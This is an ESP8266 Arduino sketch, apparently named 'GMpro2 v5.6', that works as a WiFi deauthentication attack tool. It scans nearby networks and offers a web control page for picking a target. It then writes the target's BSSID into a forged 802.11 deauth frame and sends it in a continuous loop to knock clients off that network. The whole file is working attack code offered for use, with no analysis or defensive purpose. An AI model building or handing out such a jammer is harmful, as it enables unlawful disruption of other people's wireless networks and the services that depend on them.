#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <FS.h>

extern "C" {
  #include "user_interface.h"
}

ESP8266WebServer server(80);

// --- TARGET DATA ---
String target_SSID = "NONE";
uint8_t target_BSSID[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
int target_CH = 1;
bool deauth_running = false;

// --- DEAUTH FRAME (KUNCI MATI) ---
uint8_t deauthPacket[26] = {
  0xc0, 0x00, 0x3a, 0x01, 
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Receiver
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Target)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (Target)
  0x00, 0x00, 0x01, 0x00              // Reason: Unspecified
};

const char INDEX_HTML[] PROGMEM = R"rawline(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>GMpro2 Final v5.6</title>
    <style>
        body { font-family: 'Courier New', monospace; background: #000; color: #0f0; padding: 10px; margin: 0; }
        h2 { text-align: center; color: #ff4500; text-shadow: 0 0 5px #ff4500; font-size: 16px; margin: 10px 0; }
        .status-box { border: 1px solid #444; padding: 10px; background: #111; font-size: 11px; margin-bottom: 10px; border-left: 4px solid #ff4500; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 15px; }
        .btn { padding: 12px; color: #fff; text-align: center; border-radius: 4px; font-size: 10px; font-weight: bold; border-bottom: 3px solid rgba(0,0,0,0.5); transition: 0.2s; cursor: pointer; }
        .btn-deauth { background: #c0392b; } .btn-scan { background: #2980b9; }
        .btn-log { background: #27ae60; } .btn-stop { background: #444; grid-column: span 2; }
        #log-area { background: #050505; color: #0f0; border: 1px solid #333; height: 100px; overflow-y: scroll; padding: 8px; font-size: 10px; margin-bottom: 15px; }
        table { width: 100%; border-collapse: collapse; font-size: 11px; }
        th { background: #222; color: #ff4500; padding: 10px; text-align: left; }
        td { padding: 10px; border-bottom: 1px solid #222; }
        .sel-link { color: #0af; font-weight: bold; border: 1px solid #0af; padding: 3px 6px; border-radius: 3px; }
    </style>
</head>
<body>
    <h2>M1Z23R X GMPRO2 v5.6</h2>
    <div class="status-box">TARGET: <span id="t-ssid">NONE</span><br>STATUS: <span id="t-stat">READY</span></div>
    <div class="grid">
        <div onclick="cmd('/attack')" class="btn btn-deauth">ATTACK / STOP</div>
        <div onclick="scan()" class="btn btn-scan">RE-SCAN</div>
        <div onclick="cmd('/stop')" class="btn btn-stop">RESET NODE</div>
    </div>
    <div id="log-area">Ready.</div>
    <table><thead><tr><th>SSID</th><th>CH</th><th>SIG</th><th>ACT</th></tr></thead><tbody id="wifi-table"></tbody></table>
    <script>
        function cmd(u){ fetch(u).then(r=>r.text()).then(t=>{ document.getElementById('t-stat').innerText=t; }); }
        function scan(){
            fetch('/get_wifi').then(r=>r.json()).then(d=>{
                let h=""; d.forEach(n=>{
                    h+=`<tr><td>${n.s}</td><td>${n.c}</td><td>${n.r}%</td><td><a onclick="sel('${n.s}',${n.c},'${n.b}')" class="sel-link">SELECT</a></td></tr>`;
                });
                document.getElementById('wifi-table').innerHTML=h;
            });
        }
        function sel(s,c,b){ document.getElementById('t-ssid').innerText=s; fetch(`/select?s=${s}&c=${c}&b=${b}`); }
        setInterval(scan, 15000); scan();
    </script>
</body>
</html>
)rawline";

void setup() {
  SPIFFS.begin();
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP("GMpro2", "sangkur87");
  
  server.on("/", [](){ server.send_P(200, "text/html", INDEX_HTML); });
  server.on("/get_wifi", [](){
    int n = WiFi.scanNetworks();
    String j = "[";
    for (int i=0; i<n; i++) {
      j += "{\"s\":\""+WiFi.SSID(i)+"\",\"c\":"+String(WiFi.channel(i))+",\"r\":"+String(2*(WiFi.RSSI(i)+100))+",\"b\":\""+WiFi.BSSIDstr(i)+"\"}";
      if(i<n-1) j+=",";
    }
    j += "]";
    server.send(200, "application/json", j);
  });
  server.on("/select", [](){
    target_SSID = server.arg("s");
    target_CH = server.arg("c").toInt();
    for (int i=0; i<6; i++) target_BSSID[i] = strtol(server.arg("b").substring(i*3, i*3+2).c_str(), NULL, 16);
    memcpy(&deauthPacket[10], target_BSSID, 6);
    memcpy(&deauthPacket[16], target_BSSID, 6);
    server.send(200, "text/plain", "Locked");
  });
  server.on("/attack", [](){
    deauth_running = !deauth_running;
    if(deauth_running) { wifi_promiscuous_enable(1); wifi_set_channel(target_CH); }
    else wifi_promiscuous_enable(0);
    server.send(200, "text/plain", deauth_running ? "ATTACKING" : "READY");
  });
  server.on("/stop", [](){ ESP.restart(); });
  server.begin();
}

void loop() {
  server.handleClient();
  if (deauth_running) {
    for(int i=0; i<15; i++) {
      wifi_send_pkt_freedom(deauthPacket, 26, 0);
      delay(1);
    }
    yield();
  }
}
